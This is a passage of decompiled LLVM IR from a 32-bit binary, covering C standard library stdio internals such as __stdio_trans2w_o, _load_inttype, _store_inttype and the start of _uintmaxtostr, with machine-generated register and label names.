  %v2_8055ccc = inttoptr i32 %v1_8055ccc to i32*
  %v3_8055ccc = load i32, i32* %v2_8055ccc, align 4
  store i32 %v3_8055ccc, i32* %eax.global-to-local, align 4
  %v1_8055ccf = icmp eq i1 %v13_8055cc5, false
  %v2_8055cee = sub i32 %v3_8055ccc, %v3_8055cc9
  br i1 %v1_8055ccf, label %dec_label_pc_8055cee, label %dec_label_pc_8055cd1

dec_label_pc_8055cd1:                             ; preds = %dec_label_pc_8055cc5
  %tmp = icmp uge i32 %v2_8055cee, %arg2
  %v5_8055cd8 = select i1 %tmp, i32 %arg2, i32 %v2_8055cee
  store i32 %v5_8055cd8, i32* %ebx.global-to-local, align 4
  %v3_8055cde = inttoptr i32 %v3_8055cc9 to i16*
  %v4_8055cde = call i32 @memcpy(i16* %v3_8055cde, i32 %v5_8055cd8, i32 %v3_8055ccc)
  store i32 %v4_8055cde, i32* %eax.global-to-local, align 4
  %v0_8055ce6 = load i32, i32* @esi, align 4
  %v1_8055ce6 = add i32 %v0_8055ce6, 16
  %v2_8055ce6 = inttoptr i32 %v1_8055ce6 to i32*
  %v3_8055ce6 = load i32, i32* %v2_8055ce6, align 4
  %v4_8055ce6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8055ce6 = add i32 %v4_8055ce6, %v3_8055ce6
  store i32 %v5_8055ce6, i32* %v2_8055ce6, align 4
  br label %dec_label_pc_8055d88

dec_label_pc_8055cee:                             ; preds = %dec_label_pc_8055cc5
  store i32 %v2_8055cee, i32* %eax.global-to-local, align 4
  %v6_8055cf2 = icmp ult i32 %v2_8055cee, %arg2
  br i1 %v6_8055cf2, label %dec_label_pc_8055d57, label %dec_label_pc_8055cf4

dec_label_pc_8055cf4:                             ; preds = %dec_label_pc_8055cee
  %v0_8055cf4 = load i32, i32* @ecx, align 4
  %v3_8055cf8 = inttoptr i32 %v3_8055cc9 to i16*
  %v4_8055cf8 = call i32 @memcpy(i16* %v3_8055cf8, i32 %arg2, i32 %v0_8055cf4)
  store i32 %v4_8055cf8, i32* %eax.global-to-local, align 4
  %v0_8055d00 = load i32, i32* @esi, align 4
  %v1_8055d00 = add i32 %v0_8055d00, 16
  %v2_8055d00 = inttoptr i32 %v1_8055d00 to i32*
  %v3_8055d00 = load i32, i32* %v2_8055d00, align 4
  %v4_8055d00 = load i32, i32* @edi, align 4
  %v5_8055d00 = add i32 %v4_8055d00, %v3_8055d00
  store i32 %v5_8055d00, i32* %v2_8055d00, align 4
  %v0_8055d03 = load i32, i32* @esi, align 4
  %v1_8055d03 = add i32 %v0_8055d03, 1
  %v2_8055d03 = inttoptr i32 %v1_8055d03 to i8*
  %v3_8055d03 = load i8, i8* %v2_8055d03, align 1
  %v4_8055d03 = urem i8 %v3_8055d03, 2
  %v5_8055d03 = icmp eq i8 %v4_8055d03, 0
  br i1 %v5_8055d03, label %dec_label_pc_8055d88, label %dec_label_pc_8055d09

dec_label_pc_8055d09:                             ; preds = %dec_label_pc_8055cf4
  %v0_8055d09 = load i32, i32* @edx, align 4
  %v0_8055d0a = load i32, i32* @edi, align 4
  %v4_8055d0e = call i32 @memrchr(i8 10, i32 %v0_8055d0a, i32 %v0_8055d09)
  store i32 %v4_8055d0e, i32* %eax.global-to-local, align 4
  %v1_8055d16 = icmp eq i32 %v4_8055d0e, 0
  br i1 %v1_8055d16, label %dec_label_pc_8055d88, label %dec_label_pc_8055d1a

dec_label_pc_8055d1a:                             ; preds = %dec_label_pc_8055d09
  %v0_8055d1d = load i32, i32* @esi, align 4
  %v1_8055d1e = call i32 @__stdio_wcommit(i32 %v0_8055d1d)
  store i32 %v1_8055d1e, i32* %eax.global-to-local, align 4
  %v1_8055d26 = icmp eq i32 %v1_8055d1e, 0
  br i1 %v1_8055d26, label %dec_label_pc_8055d88, label %dec_label_pc_8055d2a

dec_label_pc_8055d2a:                             ; preds = %dec_label_pc_8055d1a
  %v0_8055d2a = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_8055d2a, %v1_8055d1e
  %v5_8055d2e = select i1 %tmp20, i32 %v0_8055d2a, i32 %v1_8055d1e
  store i32 %v5_8055d2e, i32* %ebx.global-to-local, align 4
  %v2_8055d33 = sub i32 %v0_8055d2a, %v5_8055d2e
  store i32 %v2_8055d33, i32* %eax.global-to-local, align 4
  %v0_8055d35 = load i32, i32* @ebp, align 4
  %v2_8055d35 = add i32 %v0_8055d35, %v2_8055d33
  store i32 %v2_8055d35, i32* %ebp.global-to-local, align 4
  %v4_8055d3c = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_8055d2e, i32 %v2_8055d33)
  store i32 %v4_8055d3c, i32* %eax.global-to-local, align 4
  %v1_8055d44 = icmp eq i32 %v4_8055d3c, 0
  store i32 %v4_8055d3c, i32* @edx, align 4
  br i1 %v1_8055d44, label %dec_label_pc_8055d88, label %dec_label_pc_8055d4a

dec_label_pc_8055d4a:                             ; preds = %dec_label_pc_8055d2a
  %v0_8055d4a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055d4a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055d4a = sub i32 %v0_8055d4a, %v4_8055d3c
  %v2_8055d4e = add i32 %v2_8055d4a, %v1_8055d4a
  store i32 %v2_8055d4e, i32* %eax.global-to-local, align 4
  %v0_8055d50 = load i32, i32* @esi, align 4
  %v1_8055d50 = add i32 %v0_8055d50, 16
  %v2_8055d50 = inttoptr i32 %v1_8055d50 to i32*
  %v3_8055d50 = load i32, i32* %v2_8055d50, align 4
  %v5_8055d50 = sub i32 %v3_8055d50, %v2_8055d4e
  store i32 %v5_8055d50, i32* %v2_8055d50, align 4
  %v0_8055d53 = load i32, i32* @edi, align 4
  %v1_8055d53 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055d53 = sub i32 %v0_8055d53, %v1_8055d53
  store i32 %v2_8055d53, i32* @edi, align 4
  br label %dec_label_pc_8055d88

dec_label_pc_8055d57:                             ; preds = %dec_label_pc_8055cee
  %v2_8055d57 = add i32 %arg3, 8
  %v3_8055d57 = inttoptr i32 %v2_8055d57 to i32*
  %v4_8055d57 = load i32, i32* %v3_8055d57, align 4
  %v15_8055d57 = icmp eq i32 %v3_8055cc9, %v4_8055d57
  br i1 %v15_8055d57, label %dec_label_pc_8055d70, label %dec_label_pc_8055d5c

dec_label_pc_8055d5c:                             ; preds = %dec_label_pc_8055d57
  %v1_8055d60 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_8055d60, i32* %eax.global-to-local, align 4
  %v1_8055d68 = icmp eq i32 %v1_8055d60, 0
  br i1 %v1_8055d68, label %dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge, label %dec_label_pc_8055d6c

dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge: ; preds = %dec_label_pc_8055d5c
  %v0_8055d70.pre = load i32, i32* @edi, align 4
  %v0_8055d78.pre = load i32, i32* @esi, align 4
  %v2_8055d7f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8055d70

dec_label_pc_8055d6c:                             ; preds = %dec_label_pc_8055d5c
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8055d88

dec_label_pc_8055d70:                             ; preds = %dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge, %dec_label_pc_8055d57, %entry
  %v2_8055d7f = phi i32 [ %v2_8055d7f.pre, %dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge ], [ %v0_8055cab, %dec_label_pc_8055d57 ], [ %v0_8055cab, %entry ]
  %v0_8055d78 = phi i32 [ %v0_8055d78.pre, %dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge ], [ %arg3, %dec_label_pc_8055d57 ], [ %arg3, %entry ]
  %v0_8055d70 = phi i32 [ %v0_8055d70.pre, %dec_label_pc_8055d5c.dec_label_pc_8055d70_crit_edge ], [ %arg2, %dec_label_pc_8055d57 ], [ %arg2, %entry ]
  store i32 %v2_8055d7f, i32* @ebx, align 4
  store i32 %v0_8055ca9, i32* @edi, align 4
  %v4_8055d83 = inttoptr i32 %v0_8055d78 to i16*
  %v5_8055d83 = call i32 @__stdio_WRITE(i16* %v4_8055d83, i32 %v0_8055d70, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055d83, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055d88

dec_label_pc_8055d88:                             ; preds = %dec_label_pc_8055d2a, %dec_label_pc_8055d1a, %dec_label_pc_8055d09, %dec_label_pc_8055cf4, %dec_label_pc_8055d6c, %dec_label_pc_8055d4a, %dec_label_pc_8055cd1, %dec_label_pc_8055d70
  %v0_8055d8b = load i32, i32* @edi, align 4
  store i32 %v0_8055d8b, i32* %eax.global-to-local, align 4
  %v2_8055d8d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8055d8d, i32* @ebx, align 4
  store i32 %v0_8055caa, i32* @esi, align 4
  store i32 %v0_8055ca9, i32* @edi, align 4
  store i32 %v0_8055ca8, i32* @ebp, align 4
  ret i32 %v0_8055d8b

; uselistorder directives
  uselistorder i32 %v2_8055d4e, { 1, 0 }
  uselistorder i32 %v0_8055d2a, { 2, 1, 0 }
  uselistorder i32 %v1_8055d1e, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8055cee, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8055cc9, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8055ca9, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8055d88, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8055d94 = load i32, i32* @ebx, align 4
  %v4_8055d98 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8055d98, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_8055da0 = load i16, i16* %arg1, align 2
  %v3_8055da0 = zext i16 %v2_8055da0 to i32
  store i32 %v3_8055da0, i32* %eax.global-to-local, align 4
  %v2_8055da3 = and i32 %v3_8055da0, %arg2
  %v3_8055da3 = icmp eq i32 %v2_8055da3, 0
  %v1_8055da5 = icmp eq i1 %v3_8055da3, false
  br i1 %v1_8055da5, label %dec_label_pc_8055db3, label %dec_label_pc_8055da7

dec_label_pc_8055da7:                             ; preds = %entry
  %v1_8055da7 = and i32 %v3_8055da0, 2176
  %v2_8055da7 = icmp eq i32 %v1_8055da7, 0
  %v1_8055dac = icmp eq i1 %v2_8055da7, false
  br i1 %v1_8055dac, label %dec_label_pc_8055dbb, label %dec_label_pc_8055dae

dec_label_pc_8055dae:                             ; preds = %dec_label_pc_8055da7
  %v2_8055dae = or i32 %v3_8055da0, %arg2
  store i32 %v2_8055dae, i32* %eax.global-to-local, align 4
  %v1_8055db0 = trunc i32 %v2_8055dae to i16
  store i16 %v1_8055db0, i16* %arg1, align 2
  %v0_8055db3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055db3

dec_label_pc_8055db3:                             ; preds = %entry, %dec_label_pc_8055dae
  %v0_8055dfc = phi i32 [ %v4_8055d98, %entry ], [ %v0_8055db3.pre, %dec_label_pc_8055dae ]
  %v1_8055db3 = inttoptr i32 %v0_8055dfc to i16*
  %v2_8055db3 = load i16, i16* %v1_8055db3, align 2
  %v3_8055db3 = zext i16 %v2_8055db3 to i32
  store i32 %v3_8055db3, i32* %edx.global-to-local, align 4
  %v2_8055db6 = and i16 %v2_8055db3, 32
  %v3_8055db6 = icmp eq i16 %v2_8055db6, 0
  br i1 %v3_8055db6, label %dec_label_pc_8055dd3, label %dec_label_pc_8055dbb

dec_label_pc_8055dbb:                             ; preds = %dec_label_pc_8055db3, %dec_label_pc_8055da7
  %v1_8055dbb = call i32 @__errno_location(i32 %v0_8055d94)
  store i32 %v1_8055dbb, i32* %eax.global-to-local, align 4
  %v1_8055dc0 = inttoptr i32 %v1_8055dbb to i32*
  store i32 9, i32* %v1_8055dc0, align 4
  br label %dec_label_pc_8055dc6

dec_label_pc_8055dc6:                             ; preds = %dec_label_pc_8055dea, %dec_label_pc_8055dbb
  %v0_8055dc6 = load i32, i32* @ebx, align 4
  %v1_8055dc6 = inttoptr i32 %v0_8055dc6 to i32*
  %v2_8055dc6 = load i32, i32* %v1_8055dc6, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8055dcb = or i32 %v2_8055dc6, 8
  store i32 %v1_8055dcb, i32* %eax.global-to-local, align 4
  %v1_8055dce = trunc i32 %v1_8055dcb to i16
  %v3_8055dce = inttoptr i32 %v0_8055dc6 to i16*
  store i16 %v1_8055dce, i16* %v3_8055dce, align 2
  br label %dec_label_pc_8055e35

dec_label_pc_8055dd3:                             ; preds = %dec_label_pc_8055db3
  %v2_8055dd3 = urem i16 %v2_8055db3, 4
  %v3_8055dd3 = icmp eq i16 %v2_8055dd3, 0
  br i1 %v3_8055dd3, label %dec_label_pc_8055e1d, label %dec_label_pc_8055dd8

dec_label_pc_8055dd8:                             ; preds = %dec_label_pc_8055dd3
  %v2_8055dd8 = and i32 %v3_8055db3, 4
  %v3_8055dd8 = icmp eq i32 %v2_8055dd8, 0
  %v1_8055ddb = icmp eq i1 %v3_8055dd8, false
  br i1 %v1_8055ddb, label %dec_label_pc_8055e09, label %dec_label_pc_8055ddd

dec_label_pc_8055ddd:                             ; preds = %dec_label_pc_8055dd8
  %v1_8055ddd = add i32 %v0_8055dfc, 20
  %v2_8055ddd = inttoptr i32 %v1_8055ddd to i32*
  %v3_8055ddd = load i32, i32* %v2_8055ddd, align 4
  store i32 %v3_8055ddd, i32* %eax.global-to-local, align 4
  %v2_8055de0 = add i32 %v0_8055dfc, 16
  %v3_8055de0 = inttoptr i32 %v2_8055de0 to i32*
  %v4_8055de0 = load i32, i32* %v3_8055de0, align 4
  %v15_8055de0 = icmp eq i32 %v3_8055ddd, %v4_8055de0
  %v1_8055de3 = icmp eq i1 %v15_8055de0, false
  br i1 %v1_8055de3, label %dec_label_pc_8055dea, label %dec_label_pc_8055de5

dec_label_pc_8055de5:                             ; preds = %dec_label_pc_8055ddd
  %v2_8055de5 = and i32 %v3_8055db3, 2
  %v3_8055de5 = icmp eq i32 %v2_8055de5, 0
  br i1 %v3_8055de5, label %dec_label_pc_8055e09, label %dec_label_pc_8055dea

dec_label_pc_8055dea:                             ; preds = %dec_label_pc_8055de5, %dec_label_pc_8055ddd
  %v1_8055dea = and i32 %v3_8055db3, 1024
  store i32 %v1_8055dea, i32* %edx.global-to-local, align 4
  %tmp16 = udiv i32 %v1_8055dea, 1024
  %tmp17 = xor i32 %tmp16, 3
  store i32 %tmp17, i32* %eax.global-to-local, align 4
  %v5_8055dfd = call i32 @__GI_fseek(i32 %v0_8055dfc, i32 0, i32 %tmp17, i32 %v1_8055dea)
  store i32 %v5_8055dfd, i32* %eax.global-to-local, align 4
  %v1_8055e05 = icmp eq i32 %v5_8055dfd, 0
  %v1_8055e07 = icmp eq i1 %v1_8055e05, false
  br i1 %v1_8055e07, label %dec_label_pc_8055dc6, label %dec_label_pc_8055dea.dec_label_pc_8055e09_crit_edge

dec_label_pc_8055dea.dec_label_pc_8055e09_crit_edge: ; preds = %dec_label_pc_8055dea
  %v0_8055e09.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055e09

dec_label_pc_8055e09:                             ; preds = %dec_label_pc_8055dea.dec_label_pc_8055e09_crit_edge, %dec_label_pc_8055de5, %dec_label_pc_8055dd8
  %v2_8055e0e = phi i32 [ %v0_8055e09.pre, %dec_label_pc_8055dea.dec_label_pc_8055e09_crit_edge ], [ %v0_8055dfc, %dec_label_pc_8055de5 ], [ %v0_8055dfc, %dec_label_pc_8055dd8 ]
  %v1_8055e09 = inttoptr i32 %v2_8055e0e to i32*
  %v2_8055e09 = load i32, i32* %v1_8055e09, align 4
  %v1_8055e0b = and i32 %v2_8055e09, -4
  store i32 %v1_8055e0b, i32* %eax.global-to-local, align 4
  %v1_8055e0e = trunc i32 %v1_8055e0b to i16
  %v3_8055e0e = inttoptr i32 %v2_8055e0e to i16*
  store i16 %v1_8055e0e, i16* %v3_8055e0e, align 2
  %v0_8055e11 = load i32, i32* @ebx, align 4
  %v1_8055e11 = add i32 %v0_8055e11, 8
  %v2_8055e11 = inttoptr i32 %v1_8055e11 to i32*
  %v3_8055e11 = load i32, i32* %v2_8055e11, align 4
  store i32 %v3_8055e11, i32* %eax.global-to-local, align 4
  %v2_8055e14 = add i32 %v0_8055e11, 24
  %v3_8055e14 = inttoptr i32 %v2_8055e14 to i32*
  store i32 %v3_8055e11, i32* %v3_8055e14, align 4
  %v0_8055e17 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e17 = load i32, i32* @ebx, align 4
  %v2_8055e17 = add i32 %v1_8055e17, 16
  %v3_8055e17 = inttoptr i32 %v2_8055e17 to i32*
  store i32 %v0_8055e17, i32* %v3_8055e17, align 4
  %v0_8055e1a = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e1a = load i32, i32* @ebx, align 4
  %v2_8055e1a = add i32 %v1_8055e1a, 20
  %v3_8055e1a = inttoptr i32 %v2_8055e1a to i32*
  store i32 %v0_8055e1a, i32* %v3_8055e1a, align 4
  %v0_8055e1d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8055e1d

dec_label_pc_8055e1d:                             ; preds = %dec_label_pc_8055dd3, %dec_label_pc_8055e09
  %v2_8055e24 = phi i32 [ %v0_8055dfc, %dec_label_pc_8055dd3 ], [ %v0_8055e1d.pre, %dec_label_pc_8055e09 ]
  %v1_8055e1d = inttoptr i32 %v2_8055e24 to i32*
  %v2_8055e1d = load i32, i32* %v1_8055e1d, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8055e21 = or i32 %v2_8055e1d, 64
  store i32 %v1_8055e21, i32* %eax.global-to-local, align 4
  %v1_8055e24 = trunc i32 %v1_8055e21 to i16
  %v3_8055e24 = inttoptr i32 %v2_8055e24 to i16*
  store i16 %v1_8055e24, i16* %v3_8055e24, align 2
  %v0_8055e27 = load i32, i32* %eax.global-to-local, align 4
  %v1_8055e27 = urem i32 %v0_8055e27, 65536
  store i32 %v1_8055e27, i32* %eax.global-to-local, align 4
  %v3_8055e2a = and i32 %v0_8055e27, 2816
  %v4_8055e2a = icmp eq i32 %v3_8055e2a, 0
  %v1_8055e2d = icmp eq i1 %v4_8055e2a, false
  br i1 %v1_8055e2d, label %dec_label_pc_8055e35, label %dec_label_pc_8055e2f

dec_label_pc_8055e2f:                             ; preds = %dec_label_pc_8055e1d
  %v0_8055e2f = load i32, i32* @ebx, align 4
  %v1_8055e2f = add i32 %v0_8055e2f, 12
  %v2_8055e2f = inttoptr i32 %v1_8055e2f to i32*
  %v3_8055e2f = load i32, i32* %v2_8055e2f, align 4
  store i32 %v3_8055e2f, i32* %eax.global-to-local, align 4
  %v2_8055e32 = add i32 %v0_8055e2f, 28
  %v3_8055e32 = inttoptr i32 %v2_8055e32 to i32*
  store i32 %v3_8055e2f, i32* %v3_8055e32, align 4
  br label %dec_label_pc_8055e35

dec_label_pc_8055e35:                             ; preds = %dec_label_pc_8055e1d, %dec_label_pc_8055dc6, %dec_label_pc_8055e2f
  %v0_8055e35 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_8055e35, i32* %eax.global-to-local, align 4
  %v2_8055e37 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8055e37, i32* %edx.global-to-local, align 4
  store i32 %v0_8055d94, i32* @ebx, align 4
  ret i32 %v0_8055e35

; uselistorder directives
  uselistorder i32 %v0_8055e27, { 1, 0 }
  uselistorder i32 %v1_8055dea, { 1, 0, 2 }
  uselistorder i32 %v0_8055dfc, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8055da0, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055d94, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055e35, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055e1d, { 1, 0 }
  uselistorder label %dec_label_pc_8055db3, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_8055e3c = icmp slt i32 %tmp5, 0
  %v3_8055e6d = and i32 %tmp4, 2048
  %v4_8055e6d = icmp eq i32 %v3_8055e6d, 0
  br i1 %v5_8055e3c, label %dec_label_pc_8055e6d, label %dec_label_pc_8055e4b

dec_label_pc_8055e4b:                             ; preds = %entry
  %v1_8055e4e = icmp eq i1 %v4_8055e6d, false
  br i1 %v1_8055e4e, label %dec_label_pc_8055e72, label %dec_label_pc_8055e50

dec_label_pc_8055e50:                             ; preds = %dec_label_pc_8055e4b
  %v6_8055e50 = icmp eq i32 %tmp4, 256
  %v1_8055e56 = inttoptr i32 %tmp to i32*
  %v2_8055e56 = load i32, i32* %v1_8055e56, align 4
  %v1_8055e58 = icmp eq i1 %v6_8055e50, false
  br i1 %v1_8055e58, label %dec_label_pc_8055e5f, label %dec_label_pc_8055e5a

dec_label_pc_8055e5a:                             ; preds = %dec_label_pc_8055e50
  %v1_8055e5a = urem i32 %v2_8055e56, 256
  br label %dec_label_pc_8055e6a

dec_label_pc_8055e5f:                             ; preds = %dec_label_pc_8055e50
  %v6_8055e5f = icmp eq i32 %tmp4, 512
  %v1_8055e65 = icmp eq i1 %v6_8055e5f, false
  br i1 %v1_8055e65, label %dec_label_pc_8055e6a, label %dec_label_pc_8055e67

dec_label_pc_8055e67:                             ; preds = %dec_label_pc_8055e5f
  %v1_8055e67 = urem i32 %v2_8055e56, 65536
  br label %dec_label_pc_8055e6a

dec_label_pc_8055e6a:                             ; preds = %dec_label_pc_8055e5f, %dec_label_pc_8055e5a, %dec_label_pc_8055e67
  %v0_8055e6c = phi i32 [ %v2_8055e56, %dec_label_pc_8055e5f ], [ %v1_8055e5a, %dec_label_pc_8055e5a ], [ %v1_8055e67, %dec_label_pc_8055e67 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055e6c

dec_label_pc_8055e6d:                             ; preds = %entry
  br i1 %v4_8055e6d, label %dec_label_pc_8055e78, label %dec_label_pc_8055e72

dec_label_pc_8055e72:                             ; preds = %dec_label_pc_8055e6d, %dec_label_pc_8055e4b
  %v1_8055e72 = add i32 %tmp, 4
  %v2_8055e72 = inttoptr i32 %v1_8055e72 to i32*
  %v3_8055e72 = load i32, i32* %v2_8055e72, align 4
  store i32 %v3_8055e72, i32* @edx, align 4
  %v1_8055e75 = inttoptr i32 %tmp to i32*
  %v2_8055e75 = load i32, i32* %v1_8055e75, align 4
  ret i32 %v2_8055e75

dec_label_pc_8055e78:                             ; preds = %dec_label_pc_8055e6d
  %v6_8055e78 = icmp eq i32 %tmp4, 256
  %v1_8055e7e = inttoptr i32 %tmp to i32*
  %v2_8055e7e = load i32, i32* %v1_8055e7e, align 4
  %v1_8055e80 = icmp eq i1 %v6_8055e78, false
  br i1 %v1_8055e80, label %dec_label_pc_8055e87, label %dec_label_pc_8055e82

dec_label_pc_8055e82:                             ; preds = %dec_label_pc_8055e78
  %v1_8055e82 = mul i32 %v2_8055e7e, 16777216
  %v2_8055e82 = sdiv i32 %v1_8055e82, 16777216
  br label %dec_label_pc_8055e90

dec_label_pc_8055e87:                             ; preds = %dec_label_pc_8055e78
  %v6_8055e87 = icmp eq i32 %tmp4, 512
  %v1_8055e8d = icmp eq i1 %v6_8055e87, false
  br i1 %v1_8055e8d, label %dec_label_pc_8055e90, label %dec_label_pc_8055e8f

dec_label_pc_8055e8f:                             ; preds = %dec_label_pc_8055e87
  %v1_8055e8f = mul i32 %v2_8055e7e, 65536
  %v2_8055e8f = sdiv i32 %v1_8055e8f, 65536
  br label %dec_label_pc_8055e90

dec_label_pc_8055e90:                             ; preds = %dec_label_pc_8055e87, %dec_label_pc_8055e82, %dec_label_pc_8055e8f
  %v0_8055e90 = phi i32 [ %v2_8055e7e, %dec_label_pc_8055e87 ], [ %v2_8055e82, %dec_label_pc_8055e82 ], [ %v2_8055e8f, %dec_label_pc_8055e8f ]
  %v1_8055e90 = ashr i32 %v0_8055e90, 31
  store i32 %v1_8055e90, i32* @edx, align 4
  ret i32 %v0_8055e90

; uselistorder directives
  uselistorder i32 %v0_8055e90, { 1, 0 }
  uselistorder i32 %v2_8055e7e, { 2, 0, 1 }
  uselistorder i32 %v2_8055e56, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055e90, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8055e6a, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_5()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055e94 = load i32, i32* @ebx, align 4
  store i32 %v0_8055e94, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_8055e99 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_8055e99, i32* %ebx.global-to-local, align 4
  %v4_8055e9d = trunc i32 %tmp4 to i16
  %v6_8055ea5 = icmp eq i32 %tmp6, 256
  %v1_8055eab = icmp eq i1 %v6_8055ea5, false
  br i1 %v1_8055eab, label %dec_label_pc_8055eb1, label %dec_label_pc_8055ead

dec_label_pc_8055ead:                             ; preds = %entry
  %v2_8055ead = trunc i32 %tmp4 to i8
  %v4_8055ead = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055ead, i8* %v4_8055ead, align 1
  br label %dec_label_pc_8055ecf

dec_label_pc_8055eb1:                             ; preds = %entry
  %v6_8055eb1 = icmp eq i32 %tmp6, 2048
  %v1_8055eb7 = icmp eq i1 %v6_8055eb1, false
  br i1 %v1_8055eb7, label %dec_label_pc_8055ec0, label %dec_label_pc_8055eb9

dec_label_pc_8055eb9:                             ; preds = %dec_label_pc_8055eb1
  %sext2 = mul i32 %tmp4, 65536
  %v1_8055eb9 = sdiv i32 %sext2, 65536
  %v3_8055eb9 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055eb9, i32* %v3_8055eb9, align 4
  %v0_8055ebb = load i32, i32* %edx.global-to-local, align 4
  %v1_8055ebb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055ebb = add i32 %v1_8055ebb, 4
  %v3_8055ebb = inttoptr i32 %v2_8055ebb to i32*
  store i32 %v0_8055ebb, i32* %v3_8055ebb, align 4
  br label %dec_label_pc_8055ecf

dec_label_pc_8055ec0:                             ; preds = %dec_label_pc_8055eb1
  %v6_8055ec0 = icmp eq i32 %tmp6, 512
  %v1_8055ec6 = icmp eq i1 %v6_8055ec0, false
  br i1 %v1_8055ec6, label %dec_label_pc_8055ecd, label %dec_label_pc_8055ec8

dec_label_pc_8055ec8:                             ; preds = %dec_label_pc_8055ec0
  store i16 %v4_8055e9d, i16* %tmp5, align 2
  br label %dec_label_pc_8055ecf

dec_label_pc_8055ecd:                             ; preds = %dec_label_pc_8055ec0
  %sext3 = mul i32 %tmp4, 65536
  %v1_8055ecd = sdiv i32 %sext3, 65536
  %v3_8055ecd = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055ecd, i32* %v3_8055ecd, align 4
  br label %dec_label_pc_8055ecf

dec_label_pc_8055ecf:                             ; preds = %dec_label_pc_8055ec8, %dec_label_pc_8055eb9, %dec_label_pc_8055ead, %dec_label_pc_8055ecd
  %v2_8055ecf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055ecf, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8055ed0 = sdiv i32 %sext, 65536
  ret i32 %v1_8055ed0

; uselistorder directives
  uselistorder label %dec_label_pc_8055ecf, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8055edf = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055edf, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_8055eeb = icmp slt i32 %arg4, 0
  %v1_8055eed = icmp eq i1 %v2_8055eeb, false
  br i1 %v1_8055eed, label %dec_label_pc_8055f0e, label %dec_label_pc_8055eef

dec_label_pc_8055eef:                             ; preds = %entry
  %v1_8055eef = sub i32 0, %arg4
  store i32 %v1_8055eef, i32* %esi.global-to-local, align 4
